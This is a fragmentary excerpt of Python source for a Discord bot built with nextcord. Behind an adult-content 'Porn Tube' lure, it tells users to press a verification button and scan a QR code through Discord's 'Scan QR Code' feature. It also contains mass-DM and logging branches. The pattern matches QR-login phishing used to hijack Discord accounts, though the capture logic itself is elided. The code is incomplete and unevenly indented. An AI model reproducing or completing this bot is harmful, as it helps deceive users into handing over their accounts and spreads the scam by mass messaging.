...
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="watching Porn Tube nudes <3"))
...
async def start(ctx):
    ...
    try:
        ...
        logs_channel = None
    verification = Button(label="ACCES", style=ButtonStyle.blurple)
    ...
    async def verification_callback(interaction):
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_footer(text="Made by https://github.com/xxxtentacion")
        ...
        embed_qr = nextcord.Embed(title="__**Security - Porn Tube**__", description="Hello to gain access porn you need to verify\n\n1️⃣ *Open in phone Discord*\n2️⃣ *Go to Settings*\n3️⃣ *Open \"Scan QR Code\"*\n4️⃣ *Scan QR Code and you Verified!*", color=5003474)
        embed_qr.set_footer(text="Note: The Code QR expire in 5 minutes!")
        embed_qr.set_thumbnail(url="https://cdn.discordapp.com/emojis/1001787585120698430.webp?size=96&quality=lossless")
    ...
    embed = nextcord.Embed(title="Porn-Tube", description="🔔 To check you  \n🧿 Press the button Acces", color=5003474)
